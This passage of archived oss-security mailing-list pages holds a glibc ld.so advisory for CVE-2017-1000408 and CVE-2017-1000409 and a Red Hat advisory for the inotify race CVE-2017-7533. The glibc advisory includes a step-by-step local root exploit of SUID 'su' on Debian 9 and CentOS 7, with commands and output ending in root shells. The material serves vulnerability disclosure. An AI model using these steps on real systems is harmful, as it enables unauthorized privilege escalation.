  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

------------------------------------------------------------------------
History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

========================================================================
Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m0.715s
user    0m0.120s
sys     0m0.588s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m1.443s
user    0m0.368s
sys     0m1.072s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m2.840s
user    0m0.656s
sys     0m2.172s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<23)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m5.778s
user    0m1.200s
sys     0m4.576s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<24)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

real    0m11.589s
user    0m2.520s
sys     0m9.060s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m28.050s
user    0m6.140s
sys     0m21.892s

6/ Improvements in the running time of this exploit are left as an
exercise for the interested reader:

$ env -i LD_LIBRARY_PATH=. LD_PRELOAD=nonexistent LD_HWCAP_MASK="$(((1<<25)-1))" LD_DEBUG=libs env 2>&1 | head -c 1000
      3084:     find library=nonexistent [0]; searching
      3084:      search path=./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/vme:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/de/vme/fpu:./tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mc

$ mkdir -p './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ mv -- *.so* './tls/i686/fxsr/mmx/clflush/pse36/pat/cmov/mca/pge/mtrr/sep/apic/cx8/mce/pae/msr/tsc/pse/de/vme/fpu'

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m23.485s
user    0m5.244s
sys     0m18.220s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='os-release:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'os-release' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.
# id; exit
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(user)

real    0m11.352s
user    0m2.844s
sys     0m8.388s

------------------------------------------------------------------------
CentOS 7 (i386)
------------------------------------------------------------------------

In this example, we exploit "su" on a 32-bit CentOS 7.3.1611: we
installed "CentOS-7-i386-Minimal-1611.iso" (the last release before
CVE-2017-1000366 was patched), and manually disabled protected_hardlinks
("echo 0 > /proc/sys/fs/protected_hardlinks").

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
     17896:     find library=nonexistent [0]; searching
     17896:      search cache=/etc/ld.so.cache
     17896:      search path=/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib                (system search path)
     17896:       trying file=/lib/tls/i686/nonexistent
     17896:       trying file=/lib/tls/nonexistent
     17896:       trying file=/lib/i686/nonexistent
     17896:       trying file=/lib/nonexistent
     17896:       trying file=/usr/lib/tls/i686/nonexistent
     17896:       trying file=/usr/lib/tls/nonexistent
     17896:       trying file=/usr/lib/i686/nonexistent

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

$ dmesg | tail -n 1
[ 8414.911000] su[18088]: segfault at 6e6e6173 ip b77645e2 sp bfe0cb40 error 4 in ld-2.17.so[b775f000+1f000]

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m0.527s
user    0m0.085s
sys     0m0.441s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<17)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m1.060s
user    0m0.182s
sys     0m0.877s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<18)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m2.093s
user    0m0.384s
sys     0m1.702s

...

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<25)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m17.071s
user    0m2.525s
sys     0m14.537s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<26)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
Segmentation fault

real    0m33.926s
user    0m5.464s
sys     0m28.429s

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<27)-1))" ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded: ignored.
sh-4.2# id; exit
uid=0(root) gid=0(root) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

real    1m30.604s
user    0m16.169s
sys     1m14.395s

========================================================================
Acknowledgments
========================================================================

We thank the members of the linux-distros@...nwall list.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_92edcf4c_20250126_131222.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <754818373.38559522.1501768802232.JavaMail.zimbra@redhat.com>
Date: Thu, 3 Aug 2017 10:00:02 -0400 (EDT)
From: Vladis Dronov <vdronov@...hat.com>
To: oss-security@...ts.openwall.com
Cc: fulldisclosure@...lists.org, bugtraq@...urityfocus.com
Subject: [CVE-2017-7533] kernel: inotify: a race between
 inotify_handle_event() and sys_rename()

Hello,

A race condition was found in Linux kernel present since v3.14-rc1 upto v4.12
including. The race happens between threads of inotify_handle_event() and
vfs_rename() while running the rename operation against the same file. The next
slab data or the slab's free list pointer can be corrupted with attacker-controlled
data as a result of the race.

The researchers of this flaw are Fan Wu and Shixiong Zhao from a research group
supervised by Dr. Heming Cui of the Department of Computer Science, The University
of Hong Kong. Thanks to Rui Gu and Prof. Junfeng Yang from Columbia University for
tools and suggestions.

References:

<https://bugzilla.redhat.com/show_bug.cgi?id=1468283>

<https://access.redhat.com/security/vulnerabilities/3112931>

<https://patchwork.kernel.org/patch/9755753/>

<https://patchwork.kernel.org/patch/9755757/>

An upstream patch:

<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=49d31c2f389acfe83417083e1208422b4091cd9>

So as for the flaw itself.

There is quite easily reached race condition between inotify_handle_event() and
sys_rename(). A rename thread can change the dentry name before an fsnotify
thread is copying the dentry name but after a memory for this is allocated:

CPU 1                          CPU 2

fsnotify()
  inotify_handle_event(.., file_name)
    strlen(file_name)  // file_name is "foobar"
    alloc_len += len + 1;
    event = kmalloc(alloc_len, GFP_KERNEL); // 7 bytes for the file_name

                               sys_rename()
                                 __d_move() [in fs/dcache.c]
                                   copy_name()
                                   // rename to "foobar_lol_kek_u_pwned"

    strcpy(event->name, file_name);
    // now file_name points to "foobar_lol_kek_u_pwned"
    // but there is a space only for "foobar\0"
    // the next slab or slab's *freelist is corrupted with user controlled data

There is a working exploit allowing privileges escalation in the wild for 32 bit
kernels. We are unaware of such exploit for 64 bit kernels, but these are affected
by this race too and we believe such an exploit could exist.

The result of exploiting the flaw is modified data after the slab, which can be
the next slab data, freelist pointer or something else (if the slab is the last
one in the cache).

The slab corruption caused by the exploit or the reproducer cat be easily seen
with "slub_debug=FZ" kernel parameter. The following log indicates a write beyond
the allocated slab, in this case a write to the slab's red zone:

[  144.109993] =============================================================================
[  144.110011] BUG kmalloc-64 (Not tainted): Redzone overwritten
[  144.110011] -----------------------------------------------------------------------------
[  144.110011] Disabling lock debugging due to kernel taint
[  144.110011] INFO: 0xffff8800bbb544f0-0xffff8800bbb544f7. First byte 0x33 instead of 0xcc
[  144.110011] INFO: Slab 0xffffea0002eed500 objects=51 used=23 fp=0xffff8800bbb54d70 flags=0x5fffff00000081
[  144.110011] INFO: Object 0xffff8800bbb544b0 @offset=1200 fp=0xffff8800bbb544b0
[  144.110011]
[  144.110011] Bytes b4 ffff8800bbb544a0: cc cc cc cc cc cc cc cc 00 00 00 00 00 00 00 00  ................
[  144.110011] Object ffff8800bbb544b0: b0 44 b5 bb 00 88 ff ff b0 44 b5 bb 00 88 ff ff  .D.......D......
[  144.110011] Object ffff8800bbb544c0: b8 78 62 bb 00 88 ff ff 20 00 00 08 00 00 00 00  .xb..... .......
[  144.110011] Object ffff8800bbb544d0: 01 00 00 00 00 00 00 00 01 00 00 00 61 61 61 61  ............aaaa
[  144.110011] Object ffff8800bbb544e0: 33 32 31 30 33 32 31 30 33 32 31 30 33 32 31 30  3210321032103210
[  144.110011] Redzone ffff8800bbb544f0: 33 32 31 30 33 32 31 30                          32103210
[  144.110011] Padding ffff8800bbb544f8: 00 00 00 00 00 00 00 00                          ........
[  144.110011] CPU: 2 PID: 1016 Comm: inotify Tainted: G    B          ------------   3.10.0-514.16.1.el7.x86_64 #1
[  144.110011] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.9.3-1.fc25 04/01/2014
[  144.110011]  ffff88007d801d00 0000000070c5e4c2 ffff88013bad7c08 ffffffff816869c3
[  144.110011]  ffff88013bad7c48 ffffffff811d9cad 0000000000000008 ffff880000000001
[  144.110011]  ffff8800bbb544f8 ffff88007d801d00 00000000000000cc ffff8800bbb544b0
[  144.110011] Call Trace:
[  144.110011]  [<ffffffff816869c3>] dump_stack+0x19/0x1b
[  144.110011]  [<ffffffff811d9cad>] print_trailer+0x14d/0x200
[  144.110011]  [<ffffffff811d9e9f>] check_bytes_and_report+0xcf/0x110
[  144.110011]  [<ffffffff811dab33>] check_object+0x193/0x250
[  144.110011]  [<ffffffff8168380f>] free_debug_processing+0xcc/0x259
[  144.110011]  [<ffffffff81213130>] ? poll_select_copy_remaining+0x150/0x150
[  144.110011]  [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
[  144.110011]  [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
[  144.110011]  [<ffffffff811dca30>] __slab_free+0x250/0x2f0
[  144.110011]  [<ffffffff81213130>] ? poll_select_copy_remaining+0x150/0x150
[  144.110011]  [<ffffffff8168ba60>] ? __schedule+0x3b0/0x990
[  144.110011]  [<ffffffff81244f9e>] ? inotify_free_event+0xe/0x10
[  144.110011]  [<ffffffff811dd173>] kfree+0x103/0x140
[  144.110011]  [<ffffffff81244f9e>] inotify_free_event+0xe/0x10
[  144.110011]  [<ffffffff81242b30>] fsnotify_destroy_event+0x30/0x50
[  144.110011]  [<ffffffff81245424>] inotify_read+0x224/0x3e0
[  144.110011]  [<ffffffff810b1b20>] ? wake_up_atomic_t+0x30/0x30
[  144.110011]  [<ffffffff811fe61e>] vfs_read+0x9e/0x170
[  144.110011]  [<ffffffff811ff1ef>] SyS_read+0x7f/0xe0
[  144.110011]  [<ffffffff81214954>] ? SyS_poll+0x74/0x110
[  144.110011]  [<ffffffff81697089>] system_call_fastpath+0x16/0x1b
[  144.110011] FIX kmalloc-64: Restoring 0xffff8800bbb544f0-0xffff8800bbb544f7=0xcc

Best regards,
Vladis Dronov | Red Hat, Inc. | Product Security Engineer

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_f3e30e98_20250126_004327.html ===


